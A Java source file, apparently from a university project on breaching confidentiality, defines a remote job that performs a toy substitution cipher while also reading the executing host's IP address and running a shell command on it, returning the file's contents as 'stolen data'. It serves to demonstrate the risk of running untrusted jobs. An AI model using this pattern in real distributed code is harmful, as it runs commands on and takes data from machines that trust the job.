package uk.ac.rm950.breachOfConfidentialityClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.net.Inet4Address;
import java.net.UnknownHostException;

import uk.ac.rm950.remoteInterface.JobInterface;

public class SymmetricEncryptionEvil implements JobInterface<String>,
		Serializable {

	private static final long serialVersionUID = 1L;

	private StringBuffer messageBuffer;
	private SymEncryptionMethod encryptionMethod;
	private int key;

	public SymmetricEncryptionEvil(String message,
			SymEncryptionMethod encryptionMethod, int key) {
		this.messageBuffer = new StringBuffer(message);
		this.encryptionMethod = encryptionMethod;
		this.key = key;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see uk.ac.rm950.remoteInterface.JobInterface#commenceJob()
	 */
	@Override
	public String commenceJob() {
		String originalMessage = messageBuffer.toString();
		String encryptedMessage = performEncryption();

		return String.format("Original message: %s\nEncrypted messgae: %s"
				+ "\n\nThe job was executed in machine: %s."
				+ "\n\nFinally, this is the stolen data: %s", originalMessage,
				encryptedMessage, getIPAddress(),
				getCommandResult("less -N /Users/tanvir/.gitignore"));
	}

	/**
	 * Routes the encryption process based on chosen encryption method
	 * 
	 * @return encrypted text
	 */
	private String performEncryption() {
		String cipherText = null;
		switch (encryptionMethod) {
		case SUBSTITUION:
			cipherText = encryptUsingSubstitutionMethod();
			break;

		case TRANSPOSITION:
		case BLOCKING:
			cipherText = "Requested encryption method is not yet implemented.";
			break;
		}
		return cipherText;
	}

	/**
	 * Encrypts text using Symmetric SUBSTITUTION method
	 * 
	 * @return encrypted text
	 */
	private String encryptUsingSubstitutionMethod() {
		for (int i = 0; i < messageBuffer.length(); i++) {
			char originalChar = messageBuffer.charAt(i);
			char substituteChar = (char) ((int) originalChar + key);
			messageBuffer.setCharAt(i, substituteChar);
		}
		return messageBuffer.toString();
	}

	/**
	 * @return ip address of the host machine
	 */
	private String getIPAddress() {
		String ipAddrss = null;
		try {
			ipAddrss = Inet4Address.getLocalHost().toString();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		return ipAddrss;
	}

	/**
	 * The evil method that runs a nix command on the host machine in attempt to steal information
	 * 
	 * @param command
	 *            - nix command to run on a host machine
	 * @return - std output from running the nix command
	 */
	private String getCommandResult(String command) {
		StringBuffer output = new StringBuffer();
		try {
			Process process = Runtime.getRuntime().exec(command);
			process.waitFor();

			BufferedReader reader = new BufferedReader(new InputStreamReader(
					process.getInputStream()));

			String line = "";
			while ((line = reader.readLine()) != null) {
				output.append("\n" + line);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return output.toString();
	}
}
